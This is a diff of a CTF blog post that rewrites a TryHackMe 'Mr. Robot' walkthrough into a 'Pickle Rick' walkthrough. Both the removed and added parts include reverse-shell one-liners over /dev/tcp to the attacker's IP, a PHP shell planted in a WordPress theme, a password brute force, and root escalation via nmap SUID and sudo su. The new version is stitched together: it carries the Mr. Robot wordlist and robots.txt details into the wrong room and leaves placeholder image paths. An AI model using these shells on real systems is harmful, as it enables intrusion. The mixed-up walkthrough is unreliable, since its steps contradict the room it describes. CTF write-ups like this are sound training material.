@@ -1,172 +1,136 @@
 ---
 title: Pickle Rick
 categories: [TryHackMe]
-tags: [Linux, easy,]
-image: images/Rick/Rick.jpg
+tags: [Linux, easy]
+image: images/Rick/Rick.png
 ---
-**Mr. Robot** is an **medium** rated room on **TryHackMe** inspired by the Mr. Robot TV series. The challenge begins with a web server hosting a WordPress site that contains clues and vulnerabilities. By enumerating the web server, you discover hidden directories and files, leading to the extraction of sensitive information. Gaining initial access involves using cracked credentials found through wordlists and exploiting the WordPress setup.
 
+**Pickle Rick** is an **easy** rated room on **TryHackMe** inspired by the *Rick and Morty* series. This walkthrough guides you through using a custom portal to find the three secret ingredients to reverse Rick's pickle transformation.
 
-# 1. Initial Reconnaissance and Scanning:
-The first phase of any Capture The Flag (CTF) challenge is information gathering. Our goal here is to identify what services are running on the target machine and which ports are open. This intelligence sets the stage for future attacks. 
-### Nmap Scan:
-Use Nmap to scan the target's open ports, services, and versions:
+# 1. Initial Reconnaissance and Scanning
+
+Gather information about the target machine.
+
+### Nmap Scan
+Run an Nmap scan to identify open ports and services:
 
 ```console
 nmap -sC -sV -oN nmap_scan <Target_IP>
+```
 
-``` 
-●`-sC:` Enables default scripts, often revealing common vulnerabilities.  
-●`-sV:` Detects service/version information, such as Apache, OpenSSH, etc.  
-●`-oN` nmap_scan: Saves the output into a file named nmap_scan for later reference.
+- `-sC`: Runs default scripts for vulnerability checks.
+- `-sV`: Detects service versions.
+The scan reveals port 80 (HTTP) is open.
 
-### Understanding the Results:
-Look for ports such as:
+![nmap](../images/Rick/namp.png)
 
-●**Port 80** (HTTP): Likely indicates a website is running.   
-●**Port 443** (HTTPS): Secure HTTP services.   
-●**Port 22** (SSH): Useful later for remote access.  
+# 2. Web Enumeration
 
-# 2. Web Enumeration :
+Explore the web interface.
 
-With **port 80 (HTTP)** open, it's time to explore the website for hidden vulnerabilities or clues. This includes both manual inspection and automated enumeration of directories.
+### Access the Portal
+Visit `http://<Target_IP>` to access the *Rick and Morty*-themed portal. Check the page source for clues. A note reveals the username: **RickRul3s**.
 
-### Inspect the Website:
-Visit the site at `http://<Target_IP>`. The website is themed around the **Mr. Robot** show, but stay focused on finding clues. Check the **page source** for hidden comments or links that developers might have left behind.
-
-**robots.txt File:**
-The `robots.txt` file can contain sensitive or hidden information that isn't meant for users. Access it with:
+### Check robots.txt
+Retrieve hidden files:
 
 ```console
 curl http://<Target_IP>/robots.txt
-``` 
+```
 
+This uncovers:
+- `fsocity.dic`: A password wordlist.
+- `Sup3rS3cretPickl3Ingred.txt`: A file hinting at ingredients.
+Retrieve them:
 
-You'll find two key pieces of information:
-
-**●fsocity.dic:** A wordlist for brute-forcing passwords.   
-**●key-1-of-3.txt:** The first flag. Retrieve it from `http://<Target_IP>/key-1-of-3.txt`.
-Download both files:
 ```console
 wget http://<Target_IP>/fsocity.dic
-wget http://<Target_IP>/key-1-of-3.txt
-``` 
-The **fsocity.dic** file is a wordlist we will use later for brute-forcing the login credentials.
-
-# 3. Directory Brute-Forcing
-Next, we perform directory brute-forcing to uncover hidden pages or admin areas. This step can lead to further insights about the target's web structure.
-
-### Gobuster or Dirb Scan:
-
-
-```console
-gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt
-``` 
-●`u:` The target URL.
-●`w:` The wordlist (in this case, common.txt).
-●`t:` Number of threads to speed up the process.
-The scan will reveal directories like `/wp-admin` and `/wp-login.php`, indicating the presence of **WordPress** on the machine a crucial discovery, as WordPress sites are often vulnerable.
-
-# 4. WordPress Enumeration
-Knowing that the target is running WordPress, the next step is to enumerate the WordPress installation to identify users and vulnerabilities.
-
-### WPScan:
-WPScan is a great tool for WordPress enumeration. Let's start by finding users:
-
-```console
-wpscan --url http://<Target_IP> --enumerate u
-``` 
-
-This scan will likely reveal a username like **Elliot**, named after the main character from Mr. Robot. Now you have a target for a brute-force attack.
-
-# 5. Brute-Forcing WordPress Login
-With the username **Elliot** identified, the next step is to brute-force the password using the **fsocity.dic** wordlist.
-
-### WPScan Brute-Force:
-```console
-wpscan --url http://<Target_IP> --wordlist fsocity.dic --username Elliot
-```
-WPScan will attempt to log in with each password in the wordlist until it succeeds, eventually cracking the password.
-
-# 6. Gaining Access Through WordPress
-Once you’ve logged in as **Elliot** via `http://<Target_IP>/wp-login.php`, you have control over the WordPress site. Your next goal is to upload a **reverse shell** and gain access to the underlying system.
-
-### Uploading a Reverse Shell:
-Go to **Appearance > Theme Editor**, and select the `404.php` file. Replace its content with **Pentestmonkey’s PHP reverse shell**: [link](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 
-
-```console
-<?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<Your_IP>/<Your_Port> 0>&1'");
-?>
+wget http://<Target_IP>/Sup3rS3cretPickl3Ingred.txt
 ```
 
+The first ingredient is **mr_meeseek_hair**.
 
+# 3. Accessing the Command Panel
 
-Insert your local machine's IP address and the port you want to listen on.
+Navigate to `http://<Target_IP>/portal` to access the command panel.
 
-# Netcat Listener:
-On your machine, set up a listener with **Netcat**:
+### Login
+Use the credentials from the page source:
+- Username: **RickRul3s**
+- Password: (Brute-force with `fsocity.dic` if needed via external tool).
+
+### Execute Commands
+Use the command panel to list files:
 
 ```console
-nc -lvnp <Your_Port>
+ls -la
 ```
 
-# Trigger the Reverse Shell:
-Visit the following URL to execute the reverse shell:
+This reveals files like `Sup3rS3cretPickl3Ingred.txt`, `clue.txt`, etc.
+![Directory Listing](path/to/directory_listing.png)
+
+# 4. Gaining a Reverse Shell
+
+### Set Up Listener
+On your machine, start a Netcat listener:
+
 ```console
-http://<Target_IP>/wp-content/themes/<theme>/404.php
+nc -lvnp 4444
 ```
 
-This will establish a connection between the target and your local machine.
+### Execute Reverse Shell
+In the command panel, enter:
 
-
-# 7. Privilege Escalation
-Now that you have a shell, you need to escalate your privileges from a low-level user to **root**.
-
-### System Enumeration:
-Check system information and identify potential privilege escalation vectors:
 ```console
-whoami        # Check current user
-hostname      # System name
-uname -a      # Kernel version
-``` 
-### Using LinEnum or LinPEAS:
-You can automate the privilege escalation enumeration process using tools like **LinEnum** or **LinPEAS**:
-```console
-wget http://<URL_to_LinEnum>/LinEnum.sh
-chmod +x LinEnum.sh
-./LinEnum.sh
-```
-### Escalating with SUID Binaries:
-Check for binaries with the SUID bit set (which run as root even if you're a regular user):
-```console
-find / -perm -u=s -type f 2>/dev/null
-```
-If **nmap** has the SUID bit set, you can use its interactive mode to escalate privileges:
-```console
-nmap --interactive
-!sh
-``` 
-This will drop you into a root shell.
-
-
-# 8. Capture the Flags
-Now that you have root access, it's time to capture all three flags.
-
-●**First Flag**: Found in the `robots.txt` file (`key-1-of-3.txt`).
-●**Second Flag**: Search the home directories to find the second flag:
-```console
-cat /home/<username>/key-2-of-3.txt
-```
-●**Root Flag**: The final flag is usually located in the root directory:
-```console
-cat /root/key-3-of-3.txt
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
 ```
 
+Replace `10.10.10.10` with your IP. After execution, you should see a connection in your listener.
+![Reverse Shell Connection](path/to/reverse_shell.png)
 
+# 5. Privilege Escalation
 
+With the shell, escalate privileges.
 
+### Navigate and List Files
+From the shell:
 
+```console
+cd /home
+ls
+cd rick
+ls
+cd less_second_ingredients
+less second_ingredients
+```
 
-# Final Thoughts
-With root access and all flags captured, you have successfully completed the **Mr. Robot** CTF challenge on TryHackMe or Vulnhub.
+The second ingredient is **jerry_tear**.
+
+### Escalate to Root
+Check sudo privileges:
+
+```console
+sudo -l
+```
+
+If `(ALL) NOPASSWD: ALL` is allowed, run:
+
+```console
+sudo su
+cd /root
+ls
+less 3rd.txt
+```
+
+The third ingredient is **fleebs_juice**.
+![Sudo Privilege Check](path/to/sudo_check.png)
+
+# 6. Capture the Ingredients
+
+- **First Ingredient**: **mr_meeseek_hair** (from `Sup3rS3cretPickl3Ingred.txt`).
+- **Second Ingredient**: **jerry_tear** (from `less_second_ingredients/second_ingredients`).
+- **Third Ingredient**: **fleebs_juice** (from `/root/3rd.txt`).
+
+# 7. Final Thoughts
+
+You’ve successfully found all three ingredients: **mr_meeseek_hair**, **jerry_tear**, and **fleebs_juice** to help Rick. This challenge leverages a custom portal and basic Linux skills. Great job, Morty!
